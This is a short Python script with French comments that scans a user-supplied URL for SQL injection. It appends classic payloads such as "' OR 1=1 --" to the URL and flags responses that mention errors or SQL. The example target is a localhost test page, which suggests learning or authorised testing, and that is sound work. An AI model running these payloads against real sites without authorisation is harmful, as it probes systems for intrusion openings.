import requests

# Liste de petits payloads à tester
payloads = ["'", "\"", "' OR 1=1 --", "\" OR 1=1 --"]

# Fonction pour scanner une URL
def scanner_sql_injection(url):
    print(f"[+] Test de l'URL : {url}")
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if ("error" in response.text.lower() or "sql" in response.text.lower()):
                print(f"[!] Vulnérabilité potentielle trouvée avec payload : {payload}")
        except Exception as e:
            print(f"[-] Erreur lors du test : {e}")

# Exemple d'utilisation
target_url = input("Entrez l'URL cible (ex: http://localhost/vulnerable.php?id=1) : ")
scanner_sql_injection(target_url)
